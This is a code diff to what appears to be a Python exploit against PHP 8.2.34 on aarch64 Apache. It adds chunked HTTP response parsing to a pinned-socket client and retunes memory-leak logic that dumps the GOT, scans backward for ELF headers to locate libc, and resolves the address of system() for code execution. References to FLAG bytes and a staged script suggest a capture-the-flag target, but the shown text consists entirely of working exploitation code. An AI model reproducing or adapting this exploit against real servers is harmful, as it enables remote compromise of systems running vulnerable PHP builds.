@@ -279,9 +279,11 @@ def pin_open():
 
 def pin_send(body, content_type, timeout=15, want_raw=False):
     """One keep-alive request on the pin. Returns body bytes or None.
-    Content-Length framed; on framing/conn errors the pin is closed and
-    PIN['last_raw'] keeps whatever arrived (exfil checks it for FLAG bytes
-    written straight into the socket by the staged script)."""
+    Handles both Content-Length and Transfer-Encoding: chunked framing
+    (Apache 2.4 chunks dynamic responses on persistent connections).
+    On framing/conn errors the pin is closed and PIN['last_raw'] keeps
+    whatever arrived (exfil checks it for FLAG bytes written straight
+    into the socket by the staged script)."""
     global req_count, crash_count
     s = PIN['sock']
     if s is None:
@@ -303,66 +305,95 @@ def pin_send(body, content_type, timeout=15, want_raw=False):
         PIN['last_raw'] = b''
         pin_close()
         return None
+
     raw = b''
-    hdr_end = -1
-    while hdr_end < 0:
+
+    def more():
         try:
             chunk = s.recv(65536)
         except Exception:
             chunk = b''
-        if not chunk:
-            _log_shot(f'PIN-CRASH/conn-closed rawlen={len(raw)}')
-            crash_count += 1
-            PIN['last_raw'] = raw
-            pin_close()
-            return None
-        raw += chunk
-        hdr_end = raw.find(b'\r\n\r\n')
-        if len(raw) > 1 << 20:
-            break
-    if hdr_end < 0:
-        _log_shot('PIN-CRASH/no-headers')
+        if chunk:
+            return chunk
+        return None
+
+    def fail(why):
         crash_count += 1
+        _log_shot(f'{why} rawlen={len(raw)}')
         PIN['last_raw'] = raw
         pin_close()
         return None
+
+    # ---- headers ----
+    hdr_end = -1
+    while hdr_end < 0:
+        chunk = more()
+        if chunk is None:
+            return fail('PIN-CRASH/conn-closed')
+        raw += chunk
+        hdr_end = raw.find(b'\r\n\r\n')
+        if len(raw) > (1 << 20):
+            break
+    if hdr_end < 0:
+        return fail('PIN-CRASH/no-headers')
     hdr = raw[:hdr_end].decode('latin-1', 'replace')
     first = hdr.split('\r\n')[0]
     clen = None
+    te_chunked = False
     for line in hdr.split('\r\n'):
-        if line.lower().startswith('content-length:'):
+        low = line.lower()
+        if low.startswith('content-length:'):
             try:
                 clen = int(line.split(':', 1)[1].strip())
             except ValueError:
                 clen = None
-    if clen is None:
-        _log_shot('PIN-CRASH/no-content-length')
-        crash_count += 1
-        PIN['last_raw'] = raw
-        pin_close()
-        return None
-    total_need = hdr_end + 4 + clen
-    while len(raw) < total_need:
-        try:
-            chunk = s.recv(65536)
-        except Exception:
-            chunk = b''
-        if not chunk:
-            _log_shot(f'PIN-CRASH/short-read {len(raw)}/{total_need}')
-            crash_count += 1
-            PIN['last_raw'] = raw
-            pin_close()
-            return None
-        raw += chunk
-    body_data = raw[hdr_end + 4:total_need]
+        elif low.startswith('transfer-encoding:') and 'chunked' in low:
+            te_chunked = True
     if ' 500 ' in first:
-        crash_count += 1
-        _log_shot(f'PIN-CRASH/500 rawlen={total_need}')
-        PIN['last_raw'] = raw[:total_need]
-        pin_close()
-        return None
-    _log_shot(f'pin-ok rawlen={total_need} bodylen={len(body_data)} n={PIN["n"]}')
-    return (body_data, raw[:total_need]) if want_raw else body_data
+        return fail('PIN-CRASH/500')
+
+    body_data = b''
+    if clen is not None:
+        total_need = hdr_end + 4 + clen
+        while len(raw) < total_need:
+            chunk = more()
+            if chunk is None:
+                return fail(f'PIN-CRASH/short-read {len(raw)}/{total_need}')
+            raw += chunk
+        body_data = raw[hdr_end + 4:total_need]
+    elif te_chunked:
+        pos = hdr_end + 4
+        while True:
+            nl = raw.find(b'\r\n', pos)
+            if nl < 0:
+                chunk = more()
+                if chunk is None:
+                    return fail('PIN-CRASH/chunked-short')
+                raw += chunk
+                continue
+            try:
+                sz = int(raw[pos:nl].split(b';')[0].strip(), 16)
+            except ValueError:
+                return fail('PIN-CRASH/chunked-bad-size')
+            pos = nl + 2
+            if sz == 0:
+                break  # final chunk (trailers ignored)
+            while len(raw) < pos + sz + 2:
+                chunk = more()
+                if chunk is None:
+                    return fail('PIN-CRASH/chunked-short-body')
+                raw += chunk
+                continue
+            body_data += raw[pos:pos + sz]
+            pos += sz + 2
+            if len(body_data) > (1 << 22):
+                return fail('PIN-CRASH/chunked-overflow')
+    else:
+        return fail('PIN-CRASH/no-content-length')
+
+    _log_shot(f'pin-ok rawlen={len(raw)} bodylen={len(body_data)} '
+             f'chunked={te_chunked} n={PIN["n"]}')
+    return (body_data, raw) if want_raw else body_data
 
 
 # ---------------------------------------------------------------------------
@@ -1062,7 +1093,11 @@ def libc_from_got_dump(elf_base, pltgot):
     print(f"    GOT read: len={got_len}, got {len(got_data)} bytes")
 
     data_start = pltrelsz_addr + 0x08
-    libphp_end = elf_base + 0x1800000
+    # 8089 retune: libphp maps to [elf_base, elf_base+0xF09000) on this
+    # php-8.2.34 aarch64 build and libc sits just 6MB above libphp's end -
+    # the vendor's +0x1800000 (24MB) window swallowed EVERY libc pointer
+    # as a "libphp internal". 15.1MB keeps libphp inside and libc outside.
+    libphp_end = elf_base + 0xF20000
 
     # Collect external pointers (outside libphp) clustered by ~0.5MB proximity.
     ext_ptrs = []
@@ -1081,7 +1116,7 @@ def libc_from_got_dump(elf_base, pltgot):
             ptr = struct.unpack_from('<Q', got_data, qi)[0]
             if ptr < 0x100000000 or ptr > ADDR_MAX:
                 continue
-            if abs(ptr - elf_base) > 0x2000000:
+            if abs(ptr - elf_base) > 0x1000000:
                 if not any(abs(ptr - ep) < 0x200000 for ep in ext_ptrs):
                     ext_ptrs.append(ptr)
 
@@ -1095,23 +1130,25 @@ def libc_from_got_dump(elf_base, pltgot):
     for nidx, ep in enumerate(nearby):
         print(f"    Trying nearby[{nidx}] = 0x{ep:x}")
         page = ep & ~0xFFF
-        # Coarse scan with descending offsets.
-        for est_off in range(0x7F000, 0x1F000, -0x1000):
-            cand = page - est_off
+        # 8089 retune: 64KB-grid backward walk (arm64 DSO bases are 64KB-
+        # aligned; libc is 1.6MB so 64 pages = 4MB covers any pointer inside
+        # it). The old 4KB/est_off walk was too short and stopped on
+        # false-positive header-like pages.
+        for k in range(0, 64):
+            cand = page - k * 0x10000
             if cand <= 0:
-                continue
+                break
             epn = _read_elf_header(cand)
             if epn is None:
                 continue
-            print(f"      ELF @ 0x{cand:x} (phnum={epn}, est_off=0x{est_off:x})")
-            if epn >= 12:
-                # libc has many phdrs; try to resolve `system` here.
+            print(f"      ELF @ 0x{cand:x} (phnum={epn}, -{k*0x10000:#x})")
+            if epn >= 10:
                 syms = _elf_resolve_symbols(cand, epn, ['system'])
                 if syms and 'system' in syms:
                     print(f"      libc @ 0x{cand:x}, system @ 0x{syms['system']:x}")
                     return cand
-        # Fallback: standard backward 4KB scan over more pages.
-        result = _find_elf_base(ep, max_pages=128)
+        # Fallback: fine 4KB walk over 2MB.
+        result = _find_elf_base(ep, max_pages=512)
         if result:
             ebase, epn, _ = result
             print(f"      DSO @ 0x{ebase:x} (phnum={epn})")
@@ -1830,6 +1867,22 @@ def main():
 
     # R-4: dump GOT, find libc, then resolve system().
     libc_base = state_get('libc_base')
+    if not libc_base:
+        cur_tag = 'R-4 got-dump'
+        # Fast path (8089 retune): R-2's candidate list already contains the
+        # whole DSO cluster (libc included on this box); try `system` in each
+        # candidate before the expensive GOT-walk.
+        for base, phnum in (state_get('elf_candidates') or []):
+            if not base or phnum < 10:
+                continue
+            try:
+                sys_addr = gnu_hash_resolve(base, 'system')
+                libc_base = base
+                fire_log(f"[R-4] fast path: system @ {sys_addr:#x} in R-2 candidate {base:#x} (reqs={req_count})")
+                state_save(libc_base=libc_base, system_addr=sys_addr)
+                break
+            except RuntimeError:
+                continue
     if not libc_base:
         cur_tag = 'R-4 got-dump'
         libc_base = libc_from_got_dump(elf_base, pltgot)
